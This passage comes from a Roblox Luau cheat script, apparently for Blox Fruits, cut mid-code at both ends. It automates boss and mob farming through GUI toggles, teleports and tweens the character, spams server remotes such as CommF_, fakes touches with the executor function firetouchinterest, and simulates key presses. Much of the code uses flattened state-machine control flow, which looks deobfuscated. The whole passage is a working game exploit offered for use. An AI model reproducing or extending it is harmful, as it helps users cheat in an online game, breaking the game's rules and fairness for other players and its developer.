            pcall(function()
                response = game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RF/DragonHunter"):InvokeServer(unpack(tbl20))
            end)

            local flag8 = false
            local num = nil
            local v31 = nil
            local n3 = nil

            if response and response.Text then
                flag8 = true
                local text = response.Text

                if string.find(tostring(text), "Defeat") then
                    n3 = 1
                    local str = string.sub(tostring(text), 8, 9)
                    num = tonumber(str)

                    for k, v32 in pairs({"Hydra Enforcer", "Venomous Assailant"}) do
                        if string.find(text, v32) then
                            v31 = v32
                            break
                        end
                        continue
                    end
                elseif string.find(tostring(text), "Destroy") then
                    num = 10
                    n3 = 2
                    v31 = nil
                end
            end

            return flag8, v31, num, n3
        end

        BackTODoJo = function()
            for k, child in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Notifications:GetChildren()) do
                if child.Name == "NotificationTemplate" and string.find(child.Text, "Head back to the Dojo to complete more tasks") then
                    return true
                end
            end

            return false
        end

        DragonMobClear = function(arg, arg2, arg3)
            if workspace.Enemies:FindFirstChild(arg2) then
                for k, child in pairs(workspace.Enemies:GetChildren()) do
                    if child.Name == arg2 and index.Alive(child) and arg then
                        Kill(child, arg)
                    end
                end
            else
                tween(arg3)
            end
        end

        spawn(function()
            while wait() do
                if _G.FarmBlazeEM then
                    pcall(function()
                        local v31, v32, v33, v34 = checkQuesta()

                        if v31 == true and not BackTODoJo() then
                            if v34 == 1 then
                                if v32 == "Hydra Enforcer" or v32 == "Venomous Assailant" then
                                    repeat
                                        wait()
                                        DragonMobClear(true, v32, CFrame.new(4620.61572265625, 1002.2954711914062, 399.0868835449219))
                                    until not _G.FarmBlazeEM or not v31 or BackTODoJo()
                                end
                            elseif v34 == 2 and workspace.Map.Waterfall.IslandModel:FindFirstChild("Meshes/bambootree", true) then
                                local position

                                repeat
                                    wait()

                                    spawn(function()
                                        tween(workspace.Map.Waterfall.IslandModel:FindFirstChild("Meshes/bambootree", true).CFrame * CFrame.new(4, 0, 0))
                                    end)

                                    if (workspace.Map.Waterfall.IslandModel:FindFirstChild("Meshes/bambootree", true).Position - humanoidRootPart.Position).Magnitude <= 200 then
                                        position = workspace.Map.Waterfall.IslandModel:FindFirstChild("Meshes/bambootree", true).Position
                                        MousePos = position
                                        _S("Melee", "Z")
                                        _S("Melee", "X")
                                        _S("Melee", "C")
                                        wait(0.5)
                                        _S("Sword", "Z")
                                        _S("Sword", "X")
                                        wait(0.5)
                                        _S("Blox Fruit", "Z")
                                        _S("Blox Fruit", "X")
                                        _S("Blox Fruit", "C")
                                        wait(0.5)
                                        _S("Gun", "Z")
                                        _S("Gun", "X")
                                    end
                                until not _G.FarmBlazeEM or not v31 or BackTODoJo()
                            end
                        else
                            tween(CFrame.new(5813, 1208, 884))
                            DragonMobClear(false, nil, nil)
                        end
                    end)
                end
            end
        end)

        spawn(function()
            while wait(0.1) do
                if _G.FarmBlazeEM then
                    pcall(function()
                        if workspace.EmberTemplate:FindFirstChild("Part") then
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.EmberTemplate.Part.CFrame
                        end
                    end)
                end
            end
        end)

        v4:AddSection("Farm")
        local v31 = v4:AddParagraph("Elite Progress", "")

        spawn(function()
            while task.wait(Sec) do
                pcall(function()
                    local response = ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter", "Progress")
                    local deandre = workspace.Enemies:FindFirstChild("Deandre")
                    local urban = deandre or workspace.Enemies:FindFirstChild("Urban") or workspace.Enemies:FindFirstChild("Diablo")

                    if urban then
                        v31:Set(string.format("Elite Progress %s\nElite Hunter: %s %s", response, urban.Name, "✅"))
                    else
                        v31:Set(string.format("Elite Progress %s\nElite Hunter: Waiting %s", response, "⏳"))
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Auto Elite Hunter",
            Default = GetSetting("farmelite", false),
            Callback = function(farmelite)
                _G.farmelite = farmelite
                _G.SaveData.farmelite = farmelite
                SaveSettings()
            end,
        })

        spawn(function()
            local cframe = CFrame.new(-5418.72754, 314.640106, -2821.67603, 0.635103106, 1.21963922e-07, -0.77242738, -6.80497578e-08, 1, 1.01945268e-07, 0.77242738, -1.21822641e-08, 0.635103106)

            while wait(Sec) do
                pcall(function()
                    local character3, humanoidRootPart2, quest, tbl20, flag8, text, v32, v33, v34, v35, v36, v37, v38, v39, v40, v41, v42, v43, v44, v45
                    local v46, v47, v48, v49, v50, v51, v52, v53, v54, v55, v56, v57, v58, v59, v60, v61, v62, v63, v64, v65
                    local v66, v67, v68, v69, flag9, v70, v71, v72, v73, v74, v75, v76, v77, v78, v79, v80, v81, v82, v83, v84
                    local v85, n3
                    n3 = 1

                    while true do
                        if n3 == 1 then
                            if _G.farmelite then
                                n3 = 2
                            else
                                n3 = 39
                            end
                        elseif n3 == 2 then
                            character3 = localPlayer.Character
                            humanoidRootPart2 = character3

                            if character3 then
                                n3 = 3
                            else
                                n3 = 4
                            end
                        elseif n3 == 3 then
                            humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
                            n3 = 4
                        elseif n3 == 4 then
                            if humanoidRootPart2 then
                                n3 = 5
                            else
                                n3 = 38
                            end
                        elseif n3 == 5 then
                            quest = localPlayer.PlayerGui.Main.Quest
                            tbl20 = {"Diablo", "Urban", "Deandre"}
                            flag8 = false

                            if quest.Visible then
                                n3 = 6
                            else
                                n3 = 10
                            end
                        elseif n3 == 6 then
                            text = quest.Container.QuestTitle.Title.Text
                            v32, v33, v34 = pairs(tbl20)
                            v35 = v34
                            n3 = 7
                        elseif n3 == 7 then
                            v36, v37 = v32(v33, v35)

                            if v36 == nil then
                                n3 = 10
                            else
                                n3 = 8
                            end
                        elseif n3 == 8 then
                            v35 = v36

                            if string.find(text, v37) then
                                n3 = 9
                            else
                                n3 = 7
                            end
                        elseif n3 == 9 then
                            flag8 = true
                            n3 = 10
                        elseif n3 == 10 then
                            if flag8 then
                                n3 = 11
                            else
                                n3 = 25
                            end
                        elseif n3 == 11 then
                            v38, v39, v40 = pairs(ReplicatedStorage:GetChildren())
                            v41 = v40
                            v42 = v38
                            v43 = v39
                            n3 = 12
                        elseif n3 == 12 then
                            v44, v45 = v42(v43, v41)

                            if v44 == nil then
                                n3 = 18
                            else
                                n3 = 13
                            end
                        elseif n3 == 13 then
                            v46, v47, v48 = pairs(tbl20)
                            v49 = v42
                            v50 = v43
                            v51 = v48
                            n3 = 14
                        elseif n3 == 14 then
                            v52, v53 = v46(v47, v51)

                            if v52 == nil then
                                n3 = 17
                            else
                                n3 = 15
                            end
                        elseif n3 == 15 then
                            v51 = v52

                            if string.find(v45.Name, v53) then
                                n3 = 16
                            else
                                n3 = 14
                            end
                        elseif n3 == 16 then
                            tween(v45.HumanoidRootPart.CFrame)
                            n3 = 14
                        elseif n3 == 17 then
                            v41 = v44
                            v42 = v49
                            v43 = v50
                            n3 = 12
                        elseif n3 == 18 then
                            v54, v55, v56 = pairs(Enemies:GetChildren())
                            v57 = v56
                            v58 = v54
                            v59 = v55
                            n3 = 19
                        elseif n3 == 19 then
                            v60, v61 = v58(v59, v57)

                            if v60 == nil then
                                n3 = 37
                            else
                                n3 = 20
                            end
                        elseif n3 == 20 then
                            v62, v63, v64 = pairs(tbl20)
                            v65 = v58
                            v66 = v59
                            v67 = v64
                            n3 = 21
                        elseif n3 == 21 then
                            v68, v69 = v62(v63, v67)

                            if v68 == nil then
                                n3 = 24
                            else
                                n3 = 22
                            end
                        elseif n3 == 22 then
                            v67 = v68

                            if string.find(v61.Name, v69) and index.Alive(v61) then
                                n3 = 23
                            else
                                n3 = 21
                            end
                        elseif n3 == 23 then
                            wait()
                            Kill(v61, _G.farmelite)

                            if _G.farmelite and quest.Visible and v61.Parent and v61.Humanoid.Health > 0 then
                                n3 = 23
                            else
                                n3 = 21
                            end
                        elseif n3 == 24 then
                            v57 = v60
                            v58 = v65
                            v59 = v66
                            n3 = 19
                        elseif n3 == 25 then
                            flag9 = false
                            v70, v71, v72 = pairs(Enemies:GetChildren())
                            v73 = v72
                            v74 = v70
                            v75 = v71
                            n3 = 26
                        elseif n3 == 26 then
                            v76, v77 = v74(v75, v73)

                            if v76 == nil then
                                n3 = 32
                            else
                                n3 = 27
                            end
                        elseif n3 == 27 then
                            v78, v79, v80 = pairs(tbl20)
                            v81 = v74
                            v82 = v75
                            v83 = v80
                            n3 = 28
                        elseif n3 == 28 then
                            v84, v85 = v78(v79, v83)

                            if v84 == nil then
                                n3 = 31
                            else
                                n3 = 29
                            end
                        elseif n3 == 29 then
                            v83 = v84

                            if string.find(v77.Name, v85) and index.Alive(v77) then
                                n3 = 30
                            else
                                n3 = 28
                            end
                        elseif n3 == 30 then
                            flag9 = true
                            n3 = 31
                        elseif n3 == 31 then
                            v73 = v76
                            v74 = v81
                            v75 = v82

                            if flag9 then
                                n3 = 32
                            else
                                n3 = 26
                            end
                        elseif n3 == 32 then
                            if flag9 then
                                n3 = 33
                            else
                                n3 = 37
                            end
                        elseif n3 == 33 then
                            tween(cframe)
                            n3 = 34
                        elseif n3 == 34 then
                            task.wait()

                            if (humanoidRootPart2.Position - cframe.Position).Magnitude >= 50 and _G.farmelite then
                                n3 = 34
                            else
                                n3 = 35
                            end
                        elseif n3 == 35 then
                            if _G.farmelite then
                                n3 = 36
                            else
                                n3 = 37
                            end
                        elseif n3 == 36 then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("EliteHunter")
                            n3 = 37
                        elseif n3 == 37 then
                            return
                        elseif n3 == 38 then
                            return
                        elseif n3 == 39 then
                            return
                        end
                    end
                end)
            end
        end)

        v4:AddToggle({
            Name = "Stop If Have Items",
            Default = GetSetting("StopWhenChalice", true),
            Callback = function(stopWhenChalice)
                _G.StopWhenChalice = stopWhenChalice
                _G.SaveData.StopWhenChalice = stopWhenChalice
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(0.2) do
                if _G.StopWhenChalice and _G.farmelite then
                    pcall(function()
                        if LayItems("God's Chalice") or LayItems("Sweet Chalice") or LayItems("Fist of Darkness") then
                            _G.farmelite = false
                        end
                    end)
                end
            end
        end)

        v4:AddToggle({
            Name = "Auto Rip Indra",
            Default = GetSetting("AutoRipIngay", false),
            Callback = function(autoRipIngay)
                _G.AutoRipIngay = autoRipIngay
                _G.SaveData.AutoRipIngay = autoRipIngay
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                pcall(function()
                    if _G.AutoRipIngay then
                        local ripIndra = MobCheck("rip_indra")

                        if GetWP("Dark Dagger") and (GetIn("Valkyrie") or not ripIndra) then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-5097.93164, 316.447021, -3142.66602, -0.405007899, -4.31682743e-08, 0.914313197, -1.90943332e-08, 1, 3.8755779e-08, -0.914313197, -1.76180437e-09, -0.405007899))
                            wait(0.1)
                            tween(CFrame.new(-5344.822265625, 423.98541259766, -2725.0930175781))
                        else
                            repeat
                                wait()
                                Kill(ripIndra, _G.AutoRipIngay)
                            until not _G.AutoRipIngay or not ripIndra.Parent or ripIndra.Humanoid.Health <= 0
                        end
                    end
                end)
            end
        end)

        local function fn34()
            local ring = workspace._WorldOrigin:FindFirstChild("Ring")
            local fist = ring or workspace._WorldOrigin:FindFirstChild("Fist") or workspace._WorldOrigin:FindFirstChild("MochiSwirl")
            return fist
        end

        local function fn35(arg)
            if not arg then
                return
            end

            if fn34() then
                tween(arg.CFrame * CFrame.new(0, -40, 0))
            else
                tween(arg.CFrame * CFrame.new(0, 30, 0))
            end
        end

        v4:AddToggle({
            Name = "Auto Cake Prince",
            Description = "",
            Default = GetSetting("farmkata", false),
            Callback = function(farmkata)
                _G.farmkata = farmkata
                _G.SaveData.farmkata = farmkata
                SaveSettings()
            end,
        })

        task.spawn(function()
            local replicatedStorage = game.ReplicatedStorage
            local enemies2 = workspace.Enemies
            local cframe = CFrame.new(-1820.99048, 37.8376503, -12441.6777)
            local cframe2 = CFrame.new(-1927.92, 37.8, -12842.54)
            local cframe3 = CFrame.new(-2124, 69, -12401)

            getNearestMob = function(arg, arg2)
                local huge = math.huge
                local v32 = nil

                for k, child in pairs(enemies2:GetChildren()) do
                    if table.find(arg, child.Name) and child:FindFirstChild("HumanoidRootPart") and child:FindFirstChild("Humanoid") and child.Humanoid.Health > 0 then
                        local magnitude = (child.HumanoidRootPart.Position - arg2.Position).Magnitude

                        if magnitude < huge then
                            huge = magnitude
                            v32 = child
                        end
                    end
                end

                return v32
            end

            while task.wait(0.2) do
                if _G.farmkata then
                    pcall(function()
                        local character3 = localPlayer.Character
                        local humanoidRootPart2 = character3 and character3:FindFirstChild("HumanoidRootPart")
                        local quest = localPlayer.PlayerGui.Main.Quest
                        local cakeLoaf = workspace.Map:FindFirstChild("CakeLoaf")
                        local bigMirror = cakeLoaf and cakeLoaf:FindFirstChild("BigMirror")
                        if not humanoidRootPart2 then
                            return
                        end

                        if _G.AcceptQuestC and quest and not quest.Visible then
                            tween(cframe2)

                            repeat
                                task.wait()
                            until (humanoidRootPart2.Position - cframe2.Position).Magnitude < 50 or not _G.farmkata

                            replicatedStorage.Remotes.CommF_:InvokeServer("StartQuest", ({"CakeQuest2", "CakeQuest2", "CakeQuest1", "CakeQuest1"})[math.random(1, 4)], ({2, 1, 1, 2})[math.random(1, 4)])
                        end

                        if not cakeLoaf then
                            tween(cframe)
                            return
                        end
                        local cakePrince = enemies2:FindFirstChild("Cake Prince")

                        if bigMirror and (bigMirror.Other.Transparency == 0 or cakePrince) then
                            local v32 = MobCheck("Cake Prince")

                            if v32 then
                                repeat
                                    task.wait()
                                    fn35(v32.HumanoidRootPart)
                                    Kill2(v32, true)
                                until not _G.farmkata or v32.Humanoid.Health <= 0 or not v32.Parent
                            elseif bigMirror.Main then
                                if (humanoidRootPart2.Position - bigMirror.Main.Position).Magnitude <= 30 then
                                    firetouchinterest(humanoidRootPart2, bigMirror.Main, 0)
                                    task.wait(0.1)
                                    firetouchinterest(humanoidRootPart2, bigMirror.Main, 1)
                                else
                                    tween(bigMirror.Main.CFrame)
                                end
                            else
                                tween(cframe3)
                            end
                        else
                            local v32 = getNearestMob({
                                "Cookie Crafter",
                                "Cake Guard",
                                "Baking Staff",
                                "Head Baker",
                            }, humanoidRootPart2)

                            if v32 then
                                repeat
                                    task.wait()
                                    Kill(v32, true)
                                until not _G.farmkata or v32.Humanoid.Health <= 0 or not v32.Parent
                            else
                                tween(cframe)
                            end
                        end
                    end)
                end
            end
        end)

        local v32 = v4:AddParagraph("Dough Status", "Idle")

        v4:AddToggle({
            Name = "Auto Dough King[fully]",
            Default = GetSetting("doughking", false),
            Callback = function(doughking)
                _G.doughking = doughking
                _G.SaveData.doughking = doughking
                SaveSettings()
            end,
        })

        spawn(function()
            local cframe = CFrame.new(-1820.99048, 37.8376503, -12441.6777)
            local cframe2 = CFrame.new(-2124, 69, -12401)
            local cframe3 = CFrame.new(-2009.2802734375, 4532.97216796875, -14937.3076171875)
            local cframe4 = CFrame.new(-5418.72754, 314.640106, -2821.67603)

            while wait(Sec) do
                if _G.doughking then
                    pcall(function()
                        local character3, humanoidRootPart2, cakeLoaf, bigMirror, v33, response, flag8, v34, v35, v36, v37, v38, v39, v40, v41, v42, v43, v44, v45, n3
                        n3 = 1

                        while true do
                            if n3 == 1 then
                                character3 = localPlayer.Character
                                humanoidRootPart2 = character3

                                if character3 then
                                    n3 = 2
                                else
                                    n3 = 3
                                end
                            elseif n3 == 2 then
                                humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
                                n3 = 3
                            elseif n3 == 3 then
                                if humanoidRootPart2 then
                                    n3 = 4
                                else
                                    n3 = 47
                                end
                            elseif n3 == 4 then
                                cakeLoaf = workspace.Map:FindFirstChild("CakeLoaf")
                                bigMirror = cakeLoaf

                                if cakeLoaf then
                                    n3 = 5
                                else
                                    n3 = 6
                                end
                            elseif n3 == 5 then
                                bigMirror = workspace.Map.CakeLoaf:FindFirstChild("BigMirror")
                                n3 = 6
                            elseif n3 == 6 then
                                if not localPlayer.Backpack:FindFirstChild("God's Chalice") and not localPlayer.Character:FindFirstChild("God's Chalice") then
                                    n3 = 15
                                else
                                    n3 = 7
                                end
                            elseif n3 == 7 then
                                if string.find(rs.Remotes.CommF_:InvokeServer("SweetChaliceNpc"), "Where") then
                                    n3 = 8
                                else
                                    n3 = 9
                                end
                            elseif n3 == 8 then
                                v32:Set("Status: Exchanging God's Chalice")
                                rs.Remotes.CommF_:InvokeServer("SweetChaliceNpc")
                                n3 = 46
                            elseif n3 == 9 then
                                if not rs:FindFirstChild("Dough King") and not workspace.Enemies:FindFirstChild("Dough King") then
                                    n3 = 14
                                else
                                    n3 = 10
                                end
                            elseif n3 == 10 then
                                if workspace.Enemies:FindFirstChild("Dough King") then
                                    n3 = 11
                                else
                                    n3 = 13
                                end
                            elseif n3 == 11 then
                                v32:Set("Status: Farming Dough King")
                                v33 = MobCheck("Dough King")

                                if v33 then
                                    n3 = 12
                                else
                                    n3 = 46
                                end
                            elseif n3 == 12 then
                                wait()
                                fn35(v33.HumanoidRootPart)
                                Kill(v33, _G.doughking)

                                if _G.doughking and v33.Parent and v33.Humanoid.Health > 0 then
                                    n3 = 12
                                else
                                    n3 = 46
                                end
                            elseif n3 == 13 then
                                v32:Set("Status: Moving to Dough King location")
                                tween(cframe3)
                                n3 = 46
                            elseif n3 == 14 then
                                tween(cframe)
                                n3 = 46
                            elseif n3 == 15 then
                                if not localPlayer.Backpack:FindFirstChild("Sweet Chalice") and not localPlayer.Character:FindFirstChild("Sweet Chalice") then
                                    n3 = 29
                                else
                                    n3 = 16
                                end
                            elseif n3 == 16 then
                                response = rs.Remotes.CommF_:InvokeServer("CakePrinceSpawner")

                                if string.find(response, "Do you want to open the portal now?") then
                                    n3 = 17
                                else
                                    n3 = 18
                                end
                            elseif n3 == 17 then
                                v32:Set("Status: Opening Dough King portal")
                                rs.Remotes.CommF_:InvokeServer("CakePrinceSpawner")
                                n3 = 46
                            elseif n3 == 18 then
                                if bigMirror and bigMirror.Other.Transparency == 0 then
                                    n3 = 26
                                else
                                    n3 = 19
                                end
                            elseif n3 == 19 then
                                v32:Set("Status: Farming mobs to open mirror")
                                flag8 = false
                                v34, v35, v36 = pairs(workspace.Enemies:GetChildren())
                                v37 = v36
                                n3 = 20
                            elseif n3 == 20 then
                                v38, v39 = v34(v35, v37)

                                if v38 == nil then
                                    n3 = 24
                                else
                                    n3 = 21
                                end
                            elseif n3 == 21 then
                                v37 = v38

                                if (v39.Name == "Baking Staff" or v39.Name == "Head Baker" or v39.Name == "Cake Guard" or v39.Name == "Cookie Crafter") and v39.Humanoid.Health > 0 then
                                    n3 = 22
                                else
                                    n3 = 20
                                end
                            elseif n3 == 22 then
                                flag8 = true
                                n3 = 23
                            elseif n3 == 23 then
                                wait()
                                fn35(v39.HumanoidRootPart)
                                Kill(v39, _G.doughking)

                                if _G.doughking and v39.Parent and v39.Humanoid.Health > 0 then
                                    n3 = 23
                                else
                                    n3 = 20
                                end
                            elseif n3 == 24 then
                                if flag8 then
                                    n3 = 46
                                else
                                    n3 = 25
                                end
                            elseif n3 == 25 then
                                v32:Set("Status: Waiting for mobs to spawn")
                                tween(cframe)
                                n3 = 46
                            elseif n3 == 26 then
                                v32:Set("Status: Entering mirror")

                                if bigMirror.Main and (humanoidRootPart2.Position - bigMirror.Main.Position).Magnitude <= 30 then
                                    n3 = 28
                                else
                                    n3 = 27
                                end
                            elseif n3 == 27 then
                                tween(cframe2)
                                n3 = 46
                            elseif n3 == 28 then
                                firetouchinterest(humanoidRootPart2, bigMirror.Main, 0)
                                task.wait(0.1)
                                firetouchinterest(humanoidRootPart2, bigMirror.Main, 1)
                                n3 = 46
                            elseif n3 == 29 then
                                if not localPlayer.Backpack:FindFirstChild("Red Key") and not localPlayer.Character:FindFirstChild("Red Key") then
                                    n3 = 31
                                else
                                    n3 = 30
                                end
                            elseif n3 == 30 then
                                v32:Set("Status: Using Red Key")
                                rs.Remotes.CommF_:InvokeServer("CakeScientist", "Check")
                                n3 = 46
                            elseif n3 == 31 then
                                if localPlayer.PlayerGui.Main.Quest.Visible == true then
                                    n3 = 33
                                else
                                    n3 = 32
                                end
                            elseif n3 == 32 then
                                v32:Set("Status: Accepting Elite Hunter quest")
                                wait(0.5)
                                rs.Remotes.CommF_:InvokeServer("EliteHunter")
                                n3 = 46
                            elseif n3 == 33 then
                                if not string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Diablo") and not string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Deandre") and not string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Urban") then
                                    n3 = 45
                                else
                                    n3 = 34
                                end
                            elseif n3 == 34 then
                                if not workspace.Enemies:FindFirstChild("Diablo") and not workspace.Enemies:FindFirstChild("Deandre") and not workspace.Enemies:FindFirstChild("Urban") then
                                    n3 = 39
                                else
                                    n3 = 35
                                end
                            elseif n3 == 35 then
                                v32:Set("Status: Farming Elite for Red Key")
                                v40, v41, v42 = pairs(workspace.Enemies:GetChildren())
                                v43 = v42
                                n3 = 36
                            elseif n3 == 36 then
                                v44, v45 = v40(v41, v43)

                                if v44 == nil then
                                    n3 = 46
                                else
                                    n3 = 37
                                end
                            elseif n3 == 37 then
                                v43 = v44

                                if (v45.Name == "Diablo" or v45.Name == "Deandre" or v45.Name == "Urban") and v45.Humanoid.Health > 0 then
                                    n3 = 38
                                else
                                    n3 = 36
                                end
                            elseif n3 == 38 then
                                wait()
                                fn35(v45.HumanoidRootPart)
                                Kill(v45, _G.doughking)

                                if _G.doughking and v45.Humanoid.Health > 0 and v45.Parent and not localPlayer.Backpack:FindFirstChild("God's Chalice") then
                                    n3 = 38
                                else
                                    n3 = 36
                                end
                            elseif n3 == 39 then
                                v32:Set("Status: Moving to Elite location")

                                if rs:FindFirstChild("Diablo") then
                                    n3 = 40
                                else
                                    n3 = 41
                                end
                            elseif n3 == 40 then
                                tween(rs.Diablo.HumanoidRootPart.CFrame * CFrame.new(2, 20, 2))
                                n3 = 46
                            elseif n3 == 41 then
                                if rs:FindFirstChild("Deandre") then
                                    n3 = 42
                                else
                                    n3 = 43
                                end
                            elseif n3 == 42 then
                                tween(rs.Deandre.HumanoidRootPart.CFrame * CFrame.new(2, 20, 2))
                                n3 = 46
                            elseif n3 == 43 then
                                if rs:FindFirstChild("Urban") then
                                    n3 = 44
                                else
                                    n3 = 46
                                end
                            elseif n3 == 44 then
                                tween(rs.Urban.HumanoidRootPart.CFrame * CFrame.new(2, 20, 2))
                                n3 = 46
                            elseif n3 == 45 then
                                tween(cframe4)
                                n3 = 46
                            elseif n3 == 46 then
                                return
                            elseif n3 == 47 then
                                return
                            end
                        end
                    end)
                else
                    v32:Set("Idle")
                end
            end
        end)

        local Players4 = game:GetService("Players")
        local VirtualInputManager2 = game:GetService("VirtualInputManager")
        local localPlayer8 = Players4.LocalPlayer
        _G.tyr = GetSetting("tyr", false)
        local cframe = CFrame.new(-16257.8652, 22.5388432, 1062.83813, 0.91180402, 0.0737182423, -0.403954387, -0.0881307647, 0.995960832, -0.017173972, 0.401056707, 0.0512601063, 0.914617956)

        TyrantEyeCount = function()
            local map = workspace:FindFirstChild("Map")
            local tikiOutpost = map and map:FindFirstChild("TikiOutpost")
            local islandModel = tikiOutpost and tikiOutpost:FindFirstChild("IslandModel")
            if not islandModel then
                return 0
            end
            local tbl20 = {}
            local eye1 = islandModel:FindFirstChild("Eye1")
            local eye2 = islandModel:FindFirstChild("Eye2")
            local islandChunks = islandModel:FindFirstChild("IslandChunks")
            local eye3 = islandChunks and islandModel.IslandChunks:FindFirstChild("E") and islandModel.IslandChunks.E:FindFirstChild("Eye3")
            local islandChunks2 = islandModel:FindFirstChild("IslandChunks")
            local eye4 = islandChunks2 and islandModel.IslandChunks:FindFirstChild("E") and islandModel.IslandChunks.E:FindFirstChild("Eye4")
            tbl20[1] = eye1
            tbl20[2] = eye2
            tbl20[3] = eye3
            tbl20[4] = eye4
            local n3 = 0

            for i, v33 in ipairs(tbl20) do
                if v33 and v33.Transparency == 0 then
                    n3 = n3 + 1
                end
            end

            return n3
        end

        sendKey = function(arg)
            VirtualInputManager2:SendKeyEvent(true, arg, false, game)
            task.wait(0.05)
            VirtualInputManager2:SendKeyEvent(false, arg, false, game)
        end

        useTool = function(arg)
            local character3 = localPlayer8.Character
            local backpack = localPlayer8.Backpack
            if not character3 or not character3:FindFirstChild("Humanoid") or character3.Humanoid.Health <= 0 then
                return
            end

            for i, child in ipairs(backpack:GetChildren()) do
                if child:IsA("Tool") and child.ToolTip == arg then
                    child.Parent = character3
                    task.wait(0.12)

                    for i2, v33 in ipairs({"Z", "X", "C", "V", "F"}) do
                        if not _G.tyr then
                            break
                        end
                        pcall(sendKey, v33)
                        task.wait(0.12)
                    end

                    child.Parent = backpack
                    break
                end
            end
        end

        local tbl20 = {
            CFrame.new(-16332.526, 158.072, 1440.324),
            CFrame.new(-16288.609, 158.167, 1470.368),
            CFrame.new(-16245.412, 158.437, 1463.366),
            CFrame.new(-16212.468, 158.167, 1466.344),
            CFrame.new(-16211.946, 158.072, 1322.398),
            CFrame.new(-16260.921, 154.921, 1323.616),
            CFrame.new(-16297.059, 159.323, 1317.224),
            CFrame.new(-16335.096, 159.334, 1324.886),
        }

        task.spawn(function()
            while task.wait(0.15) do
                if _G.tyr then
                    pcall(function()
                        local v33, tyrantOfTheSkies, v34, v35, v36, v37, v38, v39, v40, v41, v42, v43, v44, v45, v46, v47, v48, v49, v50, v51
                        local v52, v53, v54, v55, n3
                        n3 = 1

                        while true do
                            if n3 == 1 then
                                if AutoHaki then
                                    n3 = 2
                                else
                                    n3 = 3
                                end
                            elseif n3 == 2 then
                                AutoHaki()
                                n3 = 3
                            elseif n3 == 3 then
                                v33 = TyrantEyeCount()
                                tyrantOfTheSkies = workspace.Enemies:FindFirstChild("Tyrant of the Skies")

                                if tyrantOfTheSkies and tyrantOfTheSkies:FindFirstChild("Humanoid") and tyrantOfTheSkies.Humanoid.Health > 0 then
                                    n3 = 26
                                else
                                    n3 = 4
                                end
                            elseif n3 == 4 then
                                if v33 >= 4 then
                                    n3 = 20
                                else
                                    n3 = 5
                                end
                            elseif n3 == 5 then
                                v34, v35, v36 = ipairs({
                                    "Serpent Hunter",
                                    "Skull Slayer",
                                    "Isle Champion",
                                    "Sun-kissed Warrior",
                                })

                                v37 = v36
                                v38 = v34
                                v39 = v35
                                n3 = 6
                            elseif n3 == 6 then
                                v40, v41 = v38(v39, v37)

                                if v40 == nil then
                                    n3 = 34
                                else
                                    n3 = 7
                                end
                            elseif n3 == 7 then
                                if _G.tyr then
                                    n3 = 8
                                else
                                    n3 = 34
                                end
                            elseif n3 == 8 then
                                v42, v43, v44 = ipairs(workspace.Enemies:GetChildren())
                                v45 = v38
                                v46 = v39
                                v47 = v44
                                n3 = 9
                            elseif n3 == 9 then
                                v48, v49 = v42(v43, v47)

                                if v48 == nil then
                                    n3 = 19
                                else
                                    n3 = 10
                                end
                            elseif n3 == 10 then
                                v47 = v48

                                if v49.Name == v41 and v49:FindFirstChild("Humanoid") and v49.Humanoid.Health > 0 then
                                    n3 = 11
                                else
                                    n3 = 9
                                end
                            elseif n3 == 11 then
                                if SelectWeapon and EquipTool then
                                    n3 = 12
                                else
                                    n3 = 13
                                end
                            elseif n3 == 12 then
                                EquipTool(SelectWeapon)
                                n3 = 13
                            elseif n3 == 13 then
                                if _G.tyr then
                                    n3 = 14
                                else
                                    n3 = 9
                                end
                            elseif n3 == 14 then
                                if index and Kill then
                                    n3 = 17
                                else
                                    n3 = 15
                                end
                            elseif n3 == 15 then
                                if SuperFastAttack then
                                    n3 = 16
                                else
                                    n3 = 18
                                end
                            elseif n3 == 16 then
                                SuperFastAttack()
                                n3 = 18
                            elseif n3 == 17 then
                                Kill(v49, true)
                                n3 = 18
                            elseif n3 == 18 then
                                task.wait()

                                if v49.Parent and v49.Humanoid.Health > 0 and _G.tyr then
                                    n3 = 13
                                else
                                    n3 = 9
                                end
                            elseif n3 == 19 then
                                v37 = v40
                                v38 = v45
                                v39 = v46
                                n3 = 6
                            elseif n3 == 20 then
                                v50, v51, v52 = ipairs(tbl20)
                                v53 = v52
                                n3 = 21
                            elseif n3 == 21 then
                                v54, v55 = v50(v51, v53)

                                if v54 == nil then
                                    n3 = 34
                                else
                                    n3 = 22
                                end
                            elseif n3 == 22 then
                                v53 = v54

                                if _G.tyr then
                                    n3 = 23
                                else
                                    n3 = 34
                                end
                            elseif n3 == 23 then
                                if tween then
                                    n3 = 24
                                else
                                    n3 = 25
                                end
                            elseif n3 == 24 then
                                tween(v55)
                                n3 = 25
                            elseif n3 == 25 then
                                task.wait(0.4)
                                useTool("Melee")
                                useTool("Sword")
                                useTool("Gun")
                                task.wait(0.4)
                                n3 = 21
                            elseif n3 == 26 then
                                if SelectWeapon and EquipTool then
                                    n3 = 27
                                else
                                    n3 = 28
                                end
                            elseif n3 == 27 then
                                EquipTool(SelectWeapon)
                                n3 = 28
                            elseif n3 == 28 then
                                if _G.tyr then
                                    n3 = 29
                                else
                                    n3 = 34
                                end
                            elseif n3 == 29 then
                                if index and Kill then
                                    n3 = 32
                                else
                                    n3 = 30
                                end
                            elseif n3 == 30 then
                                if SuperFastAttack then
                                    n3 = 31
                                else
                                    n3 = 33
                                end
                            elseif n3 == 31 then
                                SuperFastAttack()
                                n3 = 33
                            elseif n3 == 32 then
                                Kill(tyrantOfTheSkies, true)
                                n3 = 33
                            elseif n3 == 33 then
                                task.wait()

                                if tyrantOfTheSkies.Parent and tyrantOfTheSkies.Humanoid.Health > 0 and _G.tyr then
                                    n3 = 28
                                else
